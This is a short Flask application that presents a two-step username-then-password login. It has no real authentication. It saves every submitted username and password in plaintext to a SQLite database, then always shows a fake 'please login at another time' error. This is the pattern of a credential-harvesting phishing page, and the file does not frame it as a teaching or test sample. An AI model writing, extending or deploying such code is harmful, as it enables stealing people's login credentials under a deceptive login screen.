from flask import Flask, render_template, request, redirect, session
import sqlite3

app = Flask(__name__)
app.secret_key = "replace_with_a_secure_random_key"  # Change this in production

# ---------- DATABASE SETUP ----------
def init_db():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

# ---------- ROUTES ----------
@app.route("/")
def home():
    return redirect("/username")

@app.route("/username", methods=["GET", "POST"])
def username_page():
    if request.method == "POST":
        username = request.form.get("username")
        if username:
            session["username"] = username
            return redirect("/password")
    return render_template("usernames.html")

@app.route("/password", methods=["GET", "POST"])
def password_page():
    if request.method == "POST":
        password = request.form.get("password")
        username = session.get("username")

        if username and password:
            conn = sqlite3.connect("users.db")
            cursor = conn.cursor()
            cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
            conn.commit()
            conn.close()
            session.pop("username", None)
            return "❌ ERROR - Please login at another time"
        else:
            return "❌ ERROR - Please login at another time."

    return render_template("password.html")

if __name__ == "__main__":
    app.run(debug=True)
